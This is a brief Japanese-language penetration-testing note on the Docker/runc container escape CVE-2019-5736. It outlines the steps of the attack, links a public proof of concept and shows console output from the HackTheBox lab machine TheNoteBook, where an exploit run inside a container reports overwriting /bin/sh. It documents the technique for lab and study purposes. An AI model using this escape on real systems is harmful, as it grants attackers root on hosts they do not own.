# Docker

----

## CVE-2019-5736
* ホストマシンのroot権限で任意のコマンドが実行可能
1. コンテナ内でexploitを起動し脆弱性がトリガするまで待機
1. ホストマシンでdocker execを実行することにより、脆弱性がトリガされる
1. コンテナ内で待機していたexploitが実行され、ホストマシンのrootで任意のコマンドが実行される
* [CVE-2019-5736-PoC](https://github.com/Frichetten/CVE-2019-5736-PoC)
* Htb: TheNoteBook

  ```console
  noah@thenotebook:~$ docker --version
  Docker version 18.06.0-ce, build 0ffa825
  noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 bash
  root@0f4c2517af40:/opt/webapp# ./exploit
  [+] Overwritten /bin/sh successfully
  [+] Found the PID: 4167
  [+] Successfully got the file handle
  [+] Successfully got write handle &{0xc0000501e0}
  
  ```

  
